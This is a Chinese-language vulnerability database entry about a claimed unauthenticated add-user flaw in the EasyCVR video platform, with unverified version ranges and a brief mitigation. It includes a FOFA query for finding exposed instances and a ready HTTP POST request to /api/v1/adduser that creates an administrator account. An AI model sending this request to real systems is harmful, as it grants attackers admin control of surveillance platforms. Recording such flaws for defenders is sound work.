---
schema_version: "1"
id: "VW-20261013-CG054"
title: "EasyCVR adduser 未授权添加用户"
product: "EasyCVR"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "needs-review"
prerequisites: "来源声称 adduser 接口无需认证；型号、版本及配置边界待核"
side_effects: "创建管理员账户并改变持久用户数据；公开请求中的密码值为示例，不能认作厂商默认口令"
source: "北雪网络安全；wxvl"
source_status: "recorded"
source_url: "https://pc.fenchuan8.com/#/index?forum=110296"
version: "公开材料未给出明确版本/固件范围"
fixed_version: "公开材料未提供具体修补版本"
index_category: "Web安全/智能设备"
fofa: "title=\"EasyCVR\""
verification_source: "https://cn-sec.com/archives/5476692.html"
review_date: "2026-10-13"
---

# EasyCVR adduser 未授权添加用户

**待核范围：** 此条保留可定位转载与已有汇编中的技术材料，未核实具体受影响版本、认证配置或厂商修补版本。未将转载结论提升为厂商确认，也不以本库未复现为拒收条件。

## 漏洞描述

公开转载声称 EasyCVR `/api/v1/adduser` 接口可在未认证状态下按 `roleid=1` 创建管理员账号。库内旧汇编已含同端点和同一密码示例；此稿提供独立产品入口，来源关系与待核版本在下方说明，不把同一材料重复计为独立漏洞。

FOFA：`title="EasyCVR"`

## 影响版本

- 受影响：来源只给产品名，未给明确版本范围。
- 修复版本：来源未提供可核对的具体版本。

## 来源请求示例

```
POST /api/v1/adduser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=admin&username=admin&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
```

## 漏洞修复

限制该接口和管理服务暴露，按厂商记录确认包含修复的发行版；所引材料没有具体安全版本，不能自行填入。

## 参考

- 北雪网络安全（2026-10-06）

## 来源关系与示例边界

[库内 202309–202406 原汇编](../../其他软件/杂项/互联网公开漏洞整理%20202309-202406.md)的 EasyCVR 添加用户节已含相同接口、`roleid=1` 和密码值，但用户名示例为 `admin888`，此稿保留原提交的 `admin`，没有替换任何公开测试值。原汇编说明密码参数填写调用者自选密码的 MD5；示例字符串不是厂商默认密码，不能仅由请求认定账户已成功建立。

CN-SEC 2026-10-07 转载将内容归于北雪网络安全；原提交的论坛入口及作者日期保留，上述转载可定位到本条，但不是已独立读取的微信原文。正文里的 FOFA 仅用于产品检索，不证明命中资产受影响。

- https://cn-sec.com/archives/5476692.html

> 仅限授权测试。
